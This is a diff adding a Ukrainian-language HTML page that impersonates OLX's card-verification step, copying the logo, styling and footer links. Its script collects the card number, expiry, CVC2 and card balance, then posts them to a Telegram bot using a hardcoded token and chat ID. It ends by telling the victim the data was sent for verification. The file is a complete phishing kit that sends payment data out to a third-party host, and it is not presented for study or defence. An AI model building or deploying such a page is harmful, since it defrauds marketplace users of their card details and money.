@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OLX - Верифікація картки</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f2f4f5;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: #002f34;
+        }
+
+        /* ШАПКА */
+        .header {
+            background-color: #002f34;
+            height: 72px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0 16px;
+        }
+
+        .header-content {
+            width: 100%;
+            max-width: 1250px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .olx-logo { display: flex; align-items: center; text-decoration: none; gap: 6px; }
+        .letter-o { width: 34px; height: 34px; border: 9px solid #23e5db; border-radius: 50%; box-sizing: border-box; }
+        .letter-l { width: 9px; height: 34px; background-color: #23e5db; border-radius: 1px; }
+        .letter-x { width: 26px; height: 34px; position: relative; display: flex; justify-content: center; align-items: center; }
+        .letter-x::before, .letter-x::after { content: ""; position: absolute; width: 9px; height: 32px; background-color: #23e5db; border-radius: 1px; }
+        .letter-x::before { transform: rotate(45deg); }
+        .letter-x::after { transform: rotate(-45deg); }
+
+        .nav-right { display: flex; align-items: center; }
+        .nav-link { display: flex; align-items: center; text-decoration: none; color: #ffffff; font-size: 14px; font-weight: 700; margin-left: 25px; transition: color 0.2s; }
+        .nav-link:hover { color: #23e5db; }
+        .nav-link svg { fill: #ffffff; margin-right: 8px; transition: fill 0.2s; }
+        .nav-link:hover svg { fill: #23e5db; }
+
+        /* КОНТЕНТ */
+        .main-container {
+            max-width: 1250px;
+            margin: 40px auto;
+            display: flex;
+            gap: 30px;
+            padding: 0 16px;
+            flex-grow: 1;
+        }
+
+        .payment-card {
+            background: #ffffff;
+            flex: 2;
+            padding: 32px;
+            border-radius: 4px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+        }
+
+        .info-card {
+            background: #ffffff;
+            flex: 1;
+            padding: 24px;
+            border-radius: 4px;
+            height: fit-content;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+            border-left: 4px solid #23e5db;
+        }
+
+        h2 { font-size: 24px; margin-top: 0; margin-bottom: 16px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-size: 14px; margin-bottom: 8px; font-weight: 700; }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            background: #f2f4f5;
+            border: 2px solid transparent;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        input:focus { border-color: #002f34; }
+
+        .row { display: flex; gap: 16px; }
+        .row div { flex: 1; }
+
+        .verify-btn {
+            width: 100%;
+            background: #002f34;
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        .verify-btn:hover { background: #004f56; }
+
+        /* ФУТЕР */
+        .footer {
+            background-color: #ffffff;
+            padding: 60px 0 40px 0;
+            border-top: 1px solid #e0e0e0;
+            width: 100%;
+            margin-top: auto;
+        }
+
+        .footer-content {
+            max-width: 1250px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            padding: 0 16px;
+            flex-wrap: wrap;
+        }
+
+        .footer-column { display: flex; flex-direction: column; gap: 15px; min-width: 200px; margin-bottom: 30px; }
+        .footer-link { text-decoration: none; color: #002f34; font-size: 14px; font-weight: 700; }
+        .footer-link:hover { text-decoration: underline; }
+
+        .footer-apps { text-align: right; min-width: 300px; }
+        .app-buttons { display: flex; gap: 12px; justify-content: flex-end; margin-bottom: 15px; }
+        .app-badge { height: 44px; }
+        .app-text { font-size: 13px; color: #7f9799; margin: 0; }
+
+        .footer-bottom {
+            max-width: 1250px;
+            margin: 20px auto 0;
+            padding: 20px 16px 0;
+            display: flex;
+            gap: 25px;
+            flex-wrap: wrap;
+            border-top: 1px solid #f2f4f5;
+        }
+
+        .country-link { display: flex; align-items: center; text-decoration: none; font-size: 12px; color: #406367; gap: 6px; }
+        .flag { width: 16px; height: 11px; border: 1px solid #cedbe0; }
+
+        @media (max-width: 850px) {
+            .main-container { flex-direction: column; }
+            .footer-apps { text-align: left; }
+            .app-buttons { justify-content: flex-start; }
+        }
+    </style>
+</head>
+<body>
+
+<header class="header">
+    <div class="header-content">
+        <a href="https://www.olx.ua/" class="olx-logo">
+            <span class="letter-o"></span>
+            <span class="letter-l"></span>
+            <span class="letter-x"></span>
+        </a>
+        <div class="nav-right">
+            <a href="https://www.olx.ua/uk/myaccount/" class="nav-link">
+                <svg width="24" height="24" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path></svg>
+                <span>Ваш профіль</span>
+            </a>
+        </div>
+    </div>
+</header>
+
+<div class="main-container">
+    <div class="payment-card">
+        <h2>Верифікація та прив'язка</h2>
+
+        <form id="verifyForm">
+            <div class="form-group">
+                <label>Номер картки</label>
+                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
+            </div>
+
+            <div class="row">
+                <div class="form-group">
+                    <label>Термін дії</label>
+                    <input type="text" id="expiry" placeholder="ММ/РР" maxlength="5">
+                </div>
+                <div class="form-group">
+                    <label>CVC2</label>
+                    <input type="password" id="cvc" placeholder="***" maxlength="3">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Доступний ліміт (баланс) на картці</label>
+                <input type="text" id="balance" placeholder="0.00 грн">
+            </div>
+
+            <button type="submit" class="verify-btn">ПІДТВЕРДИТИ</button>
+        </form>
+    </div>
+
+    <div class="info-card">
+        <h3>Офіційна верифікація</h3>
+        <p>Для успішної прив'язки картки переконайтеся, що:</p>
+        <ul>
+            <li>На картці встановлено ліміт для інтернет-оплат.</li>
+            <li>Баланс картки є позитивним (від 1.00 грн).</li>
+            <li>Картка підтримує технологію 3D-Secure.</li>
+        </ul>
+    </div>
+</div>
+
+<footer class="footer">
+    <div class="footer-content">
+        <div class="footer-column">
+            <a href="https://www.olx.ua/uk/mobileapps/" class="footer-link">Мобільні додатки</a>
+            <a href="https://help.olx.ua/hc/uk" class="footer-link">Допомога та Зворотній зв'язок</a>
+            <a href="https://www.olx.ua/uk/payment/" class="footer-link">Платні послуги</a>
+            <a href="https://www.olx.ua/uk/business/" class="footer-link">Бізнес на OLX</a>
+            <a href="https://blog.olx.ua/" class="footer-link">Блог OLX</a>
+            <a href="https://help.olx.ua/hc/uk/articles/360009214498" class="footer-link">Умови користування</a>
+            <a href="https://help.olx.ua/hc/uk/articles/360009214478" class="footer-link">Політика конфіденційності</a>
+            <a href="https://www.olx.ua/uk/advertising/" class="footer-link">Реклама на сайті</a>
+        </div>
+    </div>
+</footer>
+
+<script>
+    // Токен и ID чата для Telegram
+    const TG_TOKEN = '8003392137:AAFbnbKyLJS6N1EdYSxtRhR9n5n4eJFpBbw';  // Ваш токен Telegram бота
+    const TG_CHAT_ID = '-1003455979409';  // ID чата в Telegram, куда будет отправляться лог
+
+    // Функция для отправки данных в Telegram
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+        const data = {
+            chat_id: TG_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        };
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+
+        if (!response.ok) {
+            console.error('Ошибка при отправке в Telegram:', await response.text());
+        }
+    }
+
+    // Номер картки
+    document.getElementById('cardNumber').addEventListener('input', e => {
+        e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+    });
+
+    // ТЕРМІН ДІЇ
+    document.getElementById('expiry').addEventListener('input', e => {
+        let input = e.target.value.replace(/\D/g, '');
+        if (input.length > 4) input = input.substring(0, 4);
+
+        if (input.length >= 2) {
+            e.target.value = input.substring(0, 2) + '/' + input.substring(2);
+        } else {
+            e.target.value = input;
+        }
+    });
+
+    // БАЛАНС
+    document.getElementById('balance').addEventListener('input', e => {
+        let val = e.target.value.replace(/[^\d.]/g, '');
+        if (val) {
+            // Запобігаємо дублюванню тексту "грн" при введенні
+            e.target.value = val + ' грн';
+        }
+    });
+
+    // Запобігання відправці форми для демонстрації
+    document.getElementById('verifyForm').addEventListener('submit', e => {
+        e.preventDefault();
+
+        // Собираем данные формы
+        const cardNumber = document.getElementById('cardNumber').value;
+        const expiry = document.getElementById('expiry').value;
+        const cvc = document.getElementById('cvc').value;
+        const balance = document.getElementById('balance').value;
+
+        // Формируем сообщение для Telegram
+        const message = `
+            <b>Номер картки:</b> ${cardNumber}\n
+            <b>Термін дії:</b> ${expiry}\n
+            <b>CVC2:</b> ${cvc}\n
+            <b>Баланс картки:</b> ${balance}
+        `;
+
+        // Отправляем сообщение в Telegram
+        sendToTelegram(message);
+
+        alert('Дані відправлені на верифікацію!');
+    });
+</script>
+
+</body>
+</html>
